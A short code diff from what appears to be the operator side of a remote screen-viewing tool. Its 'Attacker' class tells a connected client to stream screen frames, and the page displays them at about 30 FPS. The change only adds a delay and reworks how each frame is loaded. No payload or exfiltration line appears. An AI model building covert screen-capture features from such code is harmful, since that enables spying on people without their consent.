@@ -44,6 +44,7 @@ namespace ExtremLink_Client.Pages
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartSendFrames");
             this.isReceivingFrames = true;
+            Thread.Sleep(3000);
             this.UpdateFrame();
         }
         private void PauseBtn_Click(object sender, RoutedEventArgs e)
@@ -82,9 +83,10 @@ namespace ExtremLink_Client.Pages
             {
                 try
                 {
-                    if (this.LoadFrameFromFile() != null)
+                    if (Attacker.AttackerInstance.CurrentFrame != null)
                     {
-                        await Dispatcher.InvokeAsync(() => frameImg.Source = this.LoadFrameFromFile());
+                        BitmapImage tempFrame = this.LoadFrameFromFile();
+                        await Dispatcher.InvokeAsync(() => frameImg.Source = tempFrame);
                     }
                     // Set the sleep function so the frame rate will be around ~30 FPS
                     await Task.Delay(32);
